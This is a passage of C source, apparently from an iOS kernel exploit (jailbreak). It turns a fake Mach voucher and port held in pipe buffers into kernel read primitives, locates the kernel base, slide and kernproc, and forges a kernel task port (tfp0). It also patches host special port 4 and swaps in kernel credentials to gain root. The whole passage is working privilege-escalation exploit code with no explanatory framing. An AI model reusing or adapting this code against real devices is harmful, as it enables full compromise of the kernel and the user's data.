        bcopy((const void *)&new_voucher, (void *)ptr, sizeof(fake_ipc_voucher_t));  
    }

    LOG("realloc'ing...");

    ret = reallocate_buf(client, surface->id, spray_index, dict_small, small_dictsz);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to reallocate buf: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    for (int i = 0; i < 0x10; i++)
    {
        if (i == spray_index) 
        {
            continue;
        }

        dict_small[6] = transpose(i);

        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict_small, small_dictsz, &dummy, &size);
        if (ret != KERN_SUCCESS)
        {
            LOG("IOSurface::set_value failed: %x %s", ret, mach_error_string(ret));
            goto out;
        }
    }

    mach_port_t old_real_port = real_port_to_fake_voucher;
    ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call thread_get_mach_voucher: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    LOG("old port: %x", old_real_port);
    LOG("new port: %x", real_port_to_fake_voucher);
    
    if (old_real_port == real_port_to_fake_voucher)
    {
        LOG("failed to get new port :(");
        ret = KERN_FAILURE;
        goto out;
    }

    the_one = real_port_to_fake_voucher;

    if (!MACH_PORT_VALID(the_one))
    {
        LOG("the_one is not valid :-( failed to realloc");
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("WE REALLY TRAPPIN OUT HERE");

    /* find the index of the pipe buffer our fakeport overlapped with */
    int fakeport_pipe_index = 0;
    for (int i = 0; i < total_pipes; i++)
    {
        int rfd = pipefds[2 * i];
        size_t readsz = read(rfd, pipebuf, pagesize - 1);
        
        if (readsz != pagesize - 1)
        {
            LOG("failed to read idx %d", i);
            continue;
        }

        kport_t *iter_port = (kport_t *)pipebuf;
    
        if (iter_port->ip_srights != fakeport->ip_srights)
        {
            LOG("found our fakeport: %d", i);
            LOG("ip_srights: %d", iter_port->ip_srights);
            fakeport_pipe_index = i;

            int wfd = pipefds[2 * i + 1];
            write(wfd, pipebuf, pagesize);
        
            break;
        }
    }

    if (fakeport_pipe_index == 0)
    {
        LOG("failed to find fakeport pipe idx");
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("fakeport pipe index: %d", fakeport_pipe_index);

    LOG("starting kreads...");

    /* set up the fake task buf for use with the pid_for_task read primitive */
    int rfd = pipefds[2 * fakeport_pipe_index];
    read(rfd, pipebuf, pagesize);

    ktask_t *fake_task = (ktask_t *)((uint64_t)pipebuf + PIPEBUF_TASK_OFFSET);
    fake_task->ref_count = 0xff;
    
    int wfd = pipefds[2 * fakeport_pipe_index + 1];
    write(wfd, pipebuf, pagesize);

    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_bsd_info);

#define rk32(addr, value)\
do {\
int rfd = pipefds[2 * fakeport_pipe_index];\
read(rfd, pipebuf, pagesize);\
*read_addr_ptr = addr - offsets->struct_offsets.proc_pid;\
int wfd = pipefds[2 * fakeport_pipe_index + 1];\
write(wfd, pipebuf, pagesize);\
pid_for_task(the_one, (int *)&value);\
} while (0)

    uint32_t read64_tmp;

#define rk64(addr, value)\
do {\
rk32(addr + 0x4, read64_tmp);\
rk32(addr, value);\
value = value | ((uint64_t)read64_tmp << 32);\
} while (0)

    LOG("testing the first read...");

    uint32_t first_read_val = 0x0;
    rk32(original_port_addr, first_read_val);
    LOG("first read val = %x", first_read_val);

    if (first_read_val == 0xffffffff)
    {
        LOG("read primitive failed :(");
        ret = KERN_FAILURE;
        goto out;
    }

    ret = mach_port_insert_right(mach_task_self(), the_one, the_one, MACH_MSG_TYPE_COPY_SEND);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_port_insert_right failed: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    mach_port_t gangport;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gangport);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_port_allocate: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    ret = mach_port_insert_right(mach_task_self(), gangport, gangport, MACH_MSG_TYPE_MAKE_SEND);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to insert send right: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    ret = send_port(the_one, gangport);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to send port: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    uint64_t ikmq_base = 0x0;
    rk64(new_voucher.iv_port + offsetof(kport_t, ip_messages.port.messages), ikmq_base);
    LOG("got ikmq_base: 0x%llx", ikmq_base);

    uint64_t ikm_header = 0x0;
    rk64(ikmq_base + 0x18, ikm_header); /* ipc_kmsg->ikm_header */
    LOG("ikm_header: 0x%llx", ikm_header);

    uint64_t port_addr = 0x0;
    rk64(ikm_header + 0x24, port_addr); /* 0x24 is mach_msg_header_t + body + offset of our port into mach_port_descriptor_t */ 
    LOG("port_addr: 0x%llx", port_addr);

    uint64_t itk_space = 0x0;
    rk64(port_addr + offsetof(kport_t, ip_receiver), itk_space);
    LOG("itk_space: 0x%llx", itk_space);

    uint64_t ourtask = 0x0;
    rk64(itk_space + 0x28, ourtask); /* ipc_space->is_task */
    LOG("ourtask: 0x%llx", ourtask);

    ret = mach_ports_register(mach_task_self(), &client, 1);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_ports_register failed: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    uint64_t iosruc_port = 0x0;
    rk64(ourtask + offsets->struct_offsets.task_itk_registered, iosruc_port);
    if (iosruc_port == 0x0)
    {
        LOG("failed to get IOSurfaceRootUserClient port!");
        goto out;
    }

    uint64_t iosruc_addr = 0x0;
    rk64(iosruc_port + offsetof(kport_t, ip_kobject), iosruc_addr);
    if (iosruc_addr == 0x0)
    {
        LOG("failed to get IOSurfaceRootUserClient address!");
        goto out;
    }

    uint64_t iosruc_vtab = 0x0;
    rk64(iosruc_addr + 0x0, iosruc_vtab);
    if (iosruc_vtab == 0x0)
    {
        LOG("failed to get IOSurfaceRootUserClient vtab!");
        goto out;
    }

    uint64_t get_trap_for_index_addr = 0x0;
    rk64(iosruc_vtab + (offsets->iosurface.get_external_trap_for_index * 0x8), get_trap_for_index_addr);
    if (get_trap_for_index_addr == 0x0)
    {
        LOG("failed to get IOSurface::getExternalTrapForIndex func ptr!");
        goto out;
    }

#define KERNEL_HEADER_OFFSET        0x4000
#define KERNEL_SLIDE_STEP           0x100000
    
    uint64_t kernel_base = (get_trap_for_index_addr & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;

    do
    {
        uint32_t kbase_value = 0x0;
        rk32(kernel_base, kbase_value);
    
        if (kbase_value == MH_MAGIC_64)
        {
            LOG("found kernel_base: 0x%llx", kernel_base);
            break;
        }

        kernel_base -= KERNEL_SLIDE_STEP;
    } while (true);

    uint64_t kslide = kernel_base - offsets->constant.kernel_image_base;
    LOG("kslide: 0x%llx", kslide);

    /* find realhost */
    ret = send_port(the_one, mach_host_self());
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to send_port: %x %s", ret, mach_error_string(ret));
        goto out;
    }
    
    ikmq_base = 0x0;
    rk64(new_voucher.iv_port + offsetof(kport_t, ip_messages.port.messages), ikmq_base);
    if (ikmq_base == 0x0)
    {
        LOG("failed to find ikmq_base!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got ikmq_base: 0x%llx", ikmq_base);

    /* since this is the 2nd message we've sent to this port, our msg will lie in ipc_kmsg->next */
    uint64_t ikm_next = 0x0;
    rk64(ikmq_base + 0x8, ikm_next);
    if (ikm_next == 0x0)
    {
        LOG("failed to find ikm_next!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ikm_next: 0x%llx", ikm_next);

    ikm_header = 0x0;
    rk64(ikm_next + 0x18, ikm_header);
    if (ikm_header == 0x0)
    {
        LOG("failed to find ikm_header!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ikm_header: 0x%llx", ikm_header);

    port_addr = 0x0;
    rk64(ikm_header + 0x24, port_addr);
    if (port_addr == 0x0)
    {
        LOG("failed to find port_addr!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("port_addr: 0x%llx", port_addr);

    uint64_t realhost = 0x0;
    rk64(port_addr + offsetof(kport_t, ip_kobject), realhost);
    if (realhost == 0x0)
    {
        LOG("failed to find realhost!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("realhost: 0x%llx", realhost);

    uint64_t ourproc = 0x0;
    rk64(ourtask + offsets->struct_offsets.task_bsd_info, ourproc);
    if (ourproc == 0x0)
    {
        LOG("failed to find ourproc!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got ourproc: 0x%llx", ourproc);
    
    /* find kernproc by looping linked list */

    uint64_t kernproc = ourproc;
    while (kernproc != 0x0)
    {
        uint32_t found_pid = 0x0;
        rk32(kernproc + offsets->struct_offsets.proc_pid, found_pid);
        if (found_pid == 0)
        {
            break;
        }

        /* 
            kernproc will always be at the start of the linked list,
            so we loop backwards in order to find it
        */
        rk64(kernproc + 0x0, kernproc);
    }

    if (kernproc == 0x0)
    {
        LOG("failed to find kernproc");
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("got kernproc: 0x%llx", kernproc);

    uint64_t kerntask = 0x0;
    rk64(kernproc + offsets->struct_offsets.proc_task, kerntask);
    if (kerntask == 0x0)
    {
        LOG("failed to find kerntask!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kerntask: 0x%llx", kerntask);

    uint64_t kernel_vm_map = 0x0;
    rk64(kerntask + offsets->struct_offsets.task_vm_map, kernel_vm_map);
    if (kernel_vm_map == 0x0)
    {
        LOG("failed to find kernel_vm_map!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel vm map: 0x%llx", kernel_vm_map);

    /* 
        since our IOSurfaceRoot userclient is owned by kernel, the 
        ip_receiver field will point to kernel's ipc space 
    */ 
    uint64_t ipc_space_kernel = 0x0;
    rk64(iosruc_port + offsetof(kport_t, ip_receiver), ipc_space_kernel);
    LOG("ipc_space_kernel: 0x%llx", ipc_space_kernel);

    /* as soon as we modify our fakeport, we don't want to be using our old rw gadgets */
#undef rk64
#undef rk32

    {
        /* read in the current pipebuffer */
        int rfd = pipefds[2 * fakeport_pipe_index];
        read(rfd, pipebuf, pagesize);
    }

    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + offsets->struct_offsets.task_itk_self) = 1;

    ((kport_t *)pipebuf)->ip_receiver = ipc_space_kernel;

    {
        /* update the pipebuffer with new port/task */
        int wfd = pipefds[2 * fakeport_pipe_index + 1];\
        write(wfd, pipebuf, pagesize);\
    }

    uint64_t kbase_val = kread64(the_one, kernel_base);
    if ((uint32_t)kbase_val != MH_MAGIC_64)
    {
        LOG("failed to find kbase val! got: %llx", kbase_val);
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("read kbase: %llx", kbase_val);

    /* 
        now we've got tfp0 via our fakeport, let's build a more "proper" task port
        that's not backed on a pipebuffer
    */

    uint64_t kernel_task_buf = kalloc(the_one, 0x600);
    if (kernel_task_buf == 0x0)
    {
        LOG("failed to allocate kernel_task_buf!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("kernel_task_buf: 0x%llx", kernel_task_buf);

    /* 
        task_info TASK_DYLD_INFO patch 
        this patch (credit @Siguza) allows you to provide tfp0 to the task_info
        API, and retreive some data from the kernel's task struct
        we use it for storing the kernel base and kernel slide values 
    */ 
    *(uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_all_image_info_addr) = kernel_base;
    *(uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_all_image_info_size) = kslide;

    kwrite(the_one, kernel_task_buf, (void *)fake_task, 0x600);

    /* allocate kernel port */
    uint64_t kernel_port_buf = kalloc(the_one, 0x300);
    if (kernel_port_buf == 0x0)
    {
        LOG("failed to allocate kernel_port_buf!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("kernel_port_buf: 0x%llx", kernel_port_buf);

    kwrite64(the_one, new_voucher.iv_port + offsetof(kport_t, ip_kobject), kernel_task_buf);

    /* our fakeport lies just before our task buf in our pipebuf */
    kwrite(the_one, kernel_port_buf, (void *)pipebuf, PIPEBUF_TASK_OFFSET);

    /*
        host_get_special_port(4) patch
        allows the kernel task port to be accessed by any root process 
    */
    kwrite64(the_one, realhost + 0x10 + (sizeof(uint64_t) * 4), kernel_port_buf);

    /* eleveate creds to kernel */
    
    uint64_t orig_ucred = kread64(the_one, ourproc + offsets->struct_offsets.proc_ucred);
    LOG("original ucred: 0x%llx", orig_ucred);

    int orig_uid = getuid();

    uint64_t kern_ucred = kread64(the_one, kernproc + offsets->struct_offsets.proc_ucred);
    kwrite64(the_one, ourproc + offsets->struct_offsets.proc_ucred, kern_ucred);
    
    LOG("setuid: %d, uid: %d", setuid(0), getuid());
    if (getuid() != 0)
    {
        LOG("failed to elevate to root/kernel creds!");
        ret = KERN_FAILURE;
        goto out;
    }

    mach_port_t hsp4;
    ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
    
    /* de-elevate */

    kwrite64(the_one, ourproc + offsets->struct_offsets.proc_ucred, orig_ucred);
    
    LOG("setuid: %d, uid: %d", setuid(orig_uid), getuid());
    if (getuid() != orig_uid)
    {
        LOG("failed to de-elelvate to uid: %d", orig_uid);
        ret = KERN_FAILURE;
        goto out;
    }

    if (ret != KERN_SUCCESS ||
        !MACH_PORT_VALID(hsp4))
    {
        LOG("failed to set hsp4! error: %x %s, port: %x", ret, mach_error_string(ret), hsp4);
        goto out;   
    }

    /* test it */
    kbase_val = kread64(hsp4, kernel_base);
    if ((uint32_t)kbase_val != MH_MAGIC_64)
    {
        LOG("failed to read kernel base!");
        ret = KERN_FAILURE;
        goto out;
    }

    /* we're done! */
    LOG("tfp0 achieved!");
    LOG("base: 0x%llx", kbase_val);
    LOG("Success!");

    *tfp0_back = hsp4;
    *kbase_back = kernel_base;
    ret = KERN_SUCCESS;

out:;
    for (int i = 0; i < sizeof(preport) / sizeof(mach_port_t); i++)
    {
        mach_port_destroy(mach_task_self(), preport[i]);
    }

    for (int i = 0; i < sizeof(postport) / sizeof(mach_port_t); i++)
    {
        mach_port_destroy(mach_task_self(), postport[i]);
    }

    if (fakeport)
    {
        free((void *)fakeport);
    }

    if (the_one)
    {
        mach_port_destroy(mach_task_self(), the_one);
    }

    if (pipefds)
    {
        for (int i = 0; i < total_pipes; i++)
        {
            close(pipefds[i]);
        }

        free(pipefds);
    }

    if (pipebuf)
    {
        free(pipebuf);
    }

    return ret;
}
